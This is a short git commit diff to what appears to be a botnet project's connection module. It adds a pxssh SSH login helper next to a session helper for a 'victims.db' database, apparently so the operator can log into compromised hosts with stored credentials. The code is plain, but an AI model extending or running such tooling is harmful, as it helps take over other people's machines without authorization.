df683a8e30d38be12ba8dd2b06d81ef2ba2f9eff
Marcus <88283829+PyMarcus@users.noreply.github.com>
2023-04-16 13:02:40 -0400

    update connections

--- Botnet/connections/connections.py
+++ Botnet/connections/connections.py
@@ -1,3 +1,5 @@
+from typing import Any
+from pexpect import pxssh
 from sqlalchemy import create_engine
 from sqlalchemy.orm import sessionmaker
 from dataclasses import dataclass, Field
@@ -9,8 +11,18 @@ class Connections:
     path: str = r"../models/victims.db"
 
     @contextmanager
-    def connection(self) -> 'Session':
+    def connection_database(self) -> 'Session':
         engine = create_engine(f"sqlite:///{self.path}")
         Session = sessionmaker(bind=engine)
         session = Session()
         yield session
+
+    @contextmanager
+    def connection_ssh(self, host, user, password) -> Any:
+        try:
+            session: Any = pxssh.pxssh()
+            session.login(host, user, password)
+        except pxssh.ExceptionPxssh as e:
+            print(f"Failed to connect to {host} - {user}")
+        else:
+            yield session
